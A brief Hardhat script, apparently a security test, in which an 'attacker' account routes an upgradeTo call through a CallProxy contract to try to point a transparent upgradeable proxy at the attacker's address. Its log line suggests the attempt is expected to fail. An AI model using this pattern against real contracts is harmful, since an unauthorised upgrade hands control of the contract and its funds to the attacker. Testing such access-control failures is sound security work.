import { ethers } from "hardhat"
import { callProxyAddr, getAttacker, upgradeProxyAddr } from "../../utils"

async function main() {
    const attacker = getAttacker()
    const CallProxy = await ethers.getContractAt("CallProxy", callProxyAddr)
    const UpgradeProxy = await ethers.getContractAt("TransparentUpgradeableProxy", upgradeProxyAddr)

    const tx = await CallProxy.connect(attacker).proxy(
        upgradeProxyAddr,
        UpgradeProxy.interface.encodeFunctionData("upgradeTo", [attacker.address]),
        {
            gasLimit: 100000,
        }
    )
    console.log(`fail internal upgradeTo tx sent: ${tx.hash}`)
    await tx.wait()
}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error)
        process.exit(1)
    })
